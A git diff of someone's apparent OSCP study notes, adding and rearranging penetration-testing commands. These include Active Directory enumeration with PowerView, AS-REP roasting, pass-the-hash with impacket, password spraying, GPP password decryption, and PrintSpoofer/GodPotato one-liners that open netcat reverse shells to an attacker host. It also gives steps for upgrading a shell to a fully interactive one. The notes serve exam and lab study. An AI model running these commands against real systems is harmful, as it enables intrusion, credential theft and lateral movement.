@@ -99,9 +99,10 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 	- curl"\<target>/index.php?page=http://\<kali server>/backdoor.php&cmd=ls"
 
 ## XSS
-
+[Cheatsheet](https://notchxor.github.io/oscp-notes/2-web/xss/) from notchxor.
 ## SQLi
 [Rana Kalil Video playlist](https://www.youtube.com/watch?v=X1X1UdaC_90&list=PLuyTk2_mYISItkbigDRkL9BFpyRenqrRJ)
+[SQLi Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) from Codingo
 
 # SQL
 ## mysql
@@ -170,31 +171,6 @@ net user - get list of all local users
 net user steve - get user info for steve
 net group - all local groups
 
-### PowerView.ps1
-#May Need "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
-- Get-NetDomain
-- Get-NetUser
-- Get-NetUser | select cn (common name)
-- Get-NetUser | select cn,pwdlastset,lastlogon
-- Get-NetGroup | select cn
-- Get-NetGroup "Sales Department" | select member (get members of the Sales Department)
-- Get-NetComputer
-- Get-ObjectAcl -Identity <username>
-- Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
-          - (For example, pick different items to select)
-- Convert-SidToName <SID> (like S-1-5-21-1987370470-658905705-1781884369-1103)
-- Find-LocalAdminAccess (scanning to find local admin privileges for our user)
-
-- Get-NetSession -ComputerName <name of computer>
-(The permissions required to enumerate sessions with NetSessionEnum are defined in the SrvsvcSessionInfo registry key, which is located in the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity hive.)
-- Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
-- Get-NetUser -SPN | select samaccountname,serviceprincipalname
-          (Another way of enumerating SPNs is to let PowerView enumerate all the accounts in the domain. To obtain a clear list of SPNs, we can pipe the output into select and choose the samaccountname               and serviceprincipalname attributes)
-- Find-DomainShare
-- ls \\dc1.corp.com\sysvol\corp.com\ (for example)
-- cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
-          - gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
-
 ### Powershell
 Get-LocalUser - get list of all local users
 Get-LocalUser steve - same as net user steve
@@ -207,33 +183,59 @@ netstat -ano - liust all active network connections
   -a = all active TCP connections as well as TCP and UDP ports
   -n = disable name resolution
   -o = show process ID for each connection
-Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-  - Display 32 bit applications, remove 'select displayname' for more info
-Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-  -   - Display 64 bit applications, remove 'select displayname' for more info
+  Displays 32 bit applications, remove 'select displayname' for more info
+  - Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+ Displays 64 bit applications, remove 'select displayname' for more info
+ - Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+ 
 Get-Process - show running processes
-Get-Process <processName> | Format-List * - get all information about a process
-Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-  - find files with extension ".kdbx" anywhere on the system
-runas user:<username> cmd 
+Get-Process \<processName> | Format-List * - get all information about a process
+
+runas user\:<username> cmd 
   - will have to enter password after, but it gets a shell as that user
+
 Get-History - may not work
 (Get-PSReadlineOption).HistorySavePath
   -Then cat or type output file and check that output for interesting files
-  - For example from 16.1.4 where we had to recreate $cred, first two lines are exact quotes:
-    - $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
-    - $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
-    - Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
-- Command for finding ".kdbx" files
-	- Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+ Command for finding ".kdbx" files:
+	- Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue (for Keepass db)
 - Download file from remote server
 	- iwr -uri http://\<server IP>/file.ext -outfile file.ext\
 ### Checking privileges on service binaries
   - icacls (Windows utility) or  
   - Get-ACL (PowerShell Cmdlet)
 ### winpeas.exe
-/winpeas.exe
+./winpeas.exe
 ## Active Directory
+### PowerView.ps1
+(Import-Module .\PowerView.ps1)
+(May Need "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser")
+- Get-NetDomain
+- Get-NetUser
+- Get-NetUser | select cn (common name)
+- Get-NetUser | select cn,pwdlastset,lastlogon
+- Get-NetGroup | select cn
+- Get-NetGroup "Fart Department" | select member (get members of the Fart Department)
+- Get-NetComputer
+- Get-ObjectAcl -Identity <username>
+- Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select 
+
+SecurityIdentifier,ActiveDirectoryRights
+          - (For example, pick different items to select)
+- Convert-SidToName <SID> (like S-1-5-21-1987370470-658905705-1781884369-1103)
+- Find-LocalAdminAccess (scanning to find local admin privileges for our user)
+
+- Get-NetSession -ComputerName <name of computer>
+(The permissions required to enumerate sessions with NetSessionEnum are defined in the SrvsvcSessionInfo registry key, which is located in the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity hive.)
+- Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
+- Get-NetUser -SPN | select samaccountname,serviceprincipalname
+          (Another way of enumerating SPNs is to let PowerView enumerate all the accounts in the domain. To obtain a clear list of SPNs, we can pipe the output into select and choose the samaccountname               and serviceprincipalname attributes)
+- Find-DomainShare
+- ls \\\dc1.corp.com\sysvol\corp.com\ (for example)
+- cat \\\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+          - gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 ### Rubeus usage
           .\Rubeus.exe asreproast /nowrap
           #Displays the vulnerable user and their AS-REP hash
@@ -249,8 +251,14 @@ Get-History - may not work
 	 -  impacket-secretsdump -just-dc-user <user> \<domain.com>/\<user>:"\<password>"@\<ip>
 	 - impacket-psexec -hashes 00000000000000000000000000000000:\<NTLM hash> Administrator@\<IP> 
 
+### PowerUp.ps1
+Import-Module ./PowerUp.ps1
+Invoke-AllChecks
+- Check Abuse Function which gives necessary command
+
 ### Potato Family
--PrintSpoofer: .\PrintSpoofer.exe -c "nc.exe \<kali $IP> \<listening port> -e cmd"
+- PrintSpoofer: .\PrintSpoofer.exe -c "nc.exe \<kali $IP> \<listening port> -e cmd"
+-  GodPotato:  .\GodPotato -cmd “nc -t -e C:\Windows\System32\cmd.exe \<kali IP> \<port>
   
 
 # Linux Foothold
@@ -340,7 +348,16 @@ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /<directory you want to
 
 # Tool Syntax
 ## Crackmapexec
+crackmapexec smb <IP> -u <user file> -p '<password>' -d domain.com --continue-on-success
+## Kerbrute
+.\kerbrute_windows_amd64.exe passwordspray -d domain.com .\usernames.txt "<password>"
 ## Impacket
+### mssqlclient
+impacket-mssqlclient /<user>:/<pass>@/<target> -windows-auth
+### psexec 
+### wmiexec
+- impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@/<target> (can be 0/24)
+	- Requires an SMB connection through the firewall, the Windows File and Printer Sharing feature must be enabled, and the admin share called ADMIN$ must be available. 
 ## Metasploit
 ### Initial Usage
 Selecting a module:
@@ -489,6 +506,20 @@ For the field that says "place your shellcode here," such code can be generated 
 ## Buffer Overflow
 As these are my OSCP notes, and there is no longer a buffer overflow machine on the exam, I'm leaving this content out of the guide for brevity. Instead I'll link a resource which turned out to be better and more succinct than the notes I took on the subject when I went through the course. Here is [V1n1v131r4's guide on Buffer Overflows](https://github.com/V1n1v131r4/OSCP-Buffer-Overflow). 
 
-
-
+## Upgrading Shells to fully interactive
+### Python
+1. python -c 'import pty; pty.spawn("/bin/bash")'
+2. background reverse shell using CTRL-Z
+3. echo $TERM
+4. stty -a
+	5. Take note of the TERM type and size of the tty 
+		6. Ex: xterm-256 color and rows 38; columns 116
+5. Then with the reverse shell still in background "stty raw -echo"
+6. fg
+7. reset
+8. export SHELL=bash
+9. export TERM=xterm-256 color (for example)
+10. stty rows 38 columns 116 
+### Without Python
+script /dev/null
 
